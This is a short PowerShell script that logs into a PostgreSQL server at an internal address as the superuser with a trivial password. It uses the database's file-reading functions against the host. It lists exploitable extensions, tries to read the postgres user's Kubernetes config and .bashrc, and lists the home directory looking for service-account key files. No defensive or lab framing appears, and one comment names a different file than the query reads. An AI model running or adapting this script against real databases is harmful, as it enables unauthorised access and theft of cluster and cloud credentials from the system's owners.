$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
try {
    $c.Open()
    
    # List available extensions
    $cmd=$c.CreateCommand()
    $cmd.CommandText="SELECT name FROM pg_available_extensions WHERE name LIKE '%pl%' OR name LIKE '%fdw%' OR name LIKE '%file%' ORDER BY name"
    $r=$cmd.ExecuteReader()
    while($r.Read()){Write-Host ("EXT:"+$r[0])}
    $r.Close()
    
} catch {
    Write-Host ("ERR:"+$_)
}

try {
    # Try lo_import to read /root/.kube/config (postgres user might have group access)
    $cmd2=$c.CreateCommand()
    $cmd2.CommandText="SELECT pg_read_binary_file('/var/lib/postgresql/.kube/config')"
    $r2=$cmd2.ExecuteReader()
    while($r2.Read()){Write-Host ("PGKUBE:"+$r2[0])}
    $r2.Close()
} catch {
    Write-Host ("ERR2:"+$_)
}

try {
    # Check postgres user home dir
    $cmd3=$c.CreateCommand()
    $cmd3.CommandText="SELECT pg_read_file('/var/lib/postgresql/.bashrc')"
    $r3=$cmd3.ExecuteReader()
    while($r3.Read()){Write-Host ("BASHRC:"+$r3[0])}
    $r3.Close()
} catch {
    Write-Host ("ERR3:"+$_)
}

try {
    # Check for any SA json files in postgres data dir
    $cmd4=$c.CreateCommand()
    $cmd4.CommandText="SELECT pg_ls_dir('/var/lib/postgresql')"
    $r4=$cmd4.ExecuteReader()
    while($r4.Read()){Write-Host ("PGDIR:"+$r4[0])}
    $r4.Close()
} catch {
    Write-Host ("ERR4:"+$_)
}

$c.Close()
